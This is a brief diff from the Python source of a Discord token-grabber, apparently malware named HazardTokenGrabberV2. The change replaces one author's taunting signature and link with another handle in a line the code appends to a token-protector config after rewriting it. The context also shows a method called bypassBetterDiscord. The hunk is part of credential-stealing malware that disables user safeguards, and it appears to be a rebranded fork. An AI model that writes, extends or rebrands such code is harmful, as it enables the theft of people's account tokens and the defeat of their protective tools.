@@ -427,7 +427,7 @@ class HazardTokenGrabberV2(Functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, "a") as f:
                 f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo"
+                    "\n\n//4ndyy just shit on this token protector | 4ndyy#6969"
                 )
 
     async def bypassBetterDiscord(self):
